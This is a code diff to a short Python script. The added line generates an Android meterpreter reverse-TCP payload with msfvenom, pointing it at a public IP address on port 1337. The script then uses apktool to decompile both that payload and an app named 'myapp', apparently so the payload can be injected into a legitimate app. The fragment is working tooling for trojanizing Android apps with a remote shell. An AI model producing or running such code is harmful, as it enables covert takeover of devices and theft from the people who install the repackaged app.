@@ -6,6 +6,7 @@ import os
 
 if __name__ == '__main__':
 	appName = 'myapp'
+	os.system("msfvenom -p android/meterpreter/reverse_tcp lhost=3.236.240.204 lport=1337 -o venom.apk")
 	os.system("apktool d venom.apk")
 	os.system(f"apktool d {appName}.apk")
 	os.mkdir(f'{appName}/smali/com/x64/')
